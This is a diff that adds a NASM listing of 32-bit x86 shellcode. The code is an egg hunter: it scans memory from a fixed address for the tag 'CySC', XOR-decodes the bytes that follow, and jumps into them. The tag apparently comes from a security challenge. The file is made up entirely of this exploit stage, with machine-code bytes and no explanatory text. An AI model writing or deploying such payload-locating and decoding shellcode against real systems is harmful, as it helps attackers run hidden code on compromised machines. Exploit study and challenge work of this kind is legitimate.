@@ -1,0 +1,26 @@
+     1                                  BITS 32
+     2                                  
+     3                                  start:
+     4                                  
+     5 00000000 B8FF9F46B7                    mov eax, 0xb7469FFF
+     6 00000005 BB43795343                    mov ebx, 'CySC'
+     7                                  compare:
+     8                                  
+     9 0000000A 40                            inc eax
+    10 0000000B 3918                          cmp [eax], ebx
+    11 0000000D 75FB                          jne compare
+    12                                  
+    13                                  foundit:
+    14 0000000F 31C9                          xor ecx, ecx
+    15 00000011 88C1                          mov cl, al
+    16 00000013 31DB                          xor ebx, ebx
+    17                                  
+    18                                  deobfuscate:
+    19 00000015 FECB                          dec bl
+    20 00000017 300418                        xor [eax+ebx],al
+    21 0000001A 80FB04                        cmp bl, 0x4
+    22 0000001D 75F6                          jne deobfuscate
+    23                                  
+    24                                  execute:
+    25 0000001F 0504000000                    add eax, 4
+    26 00000024 FFD0                          call eax
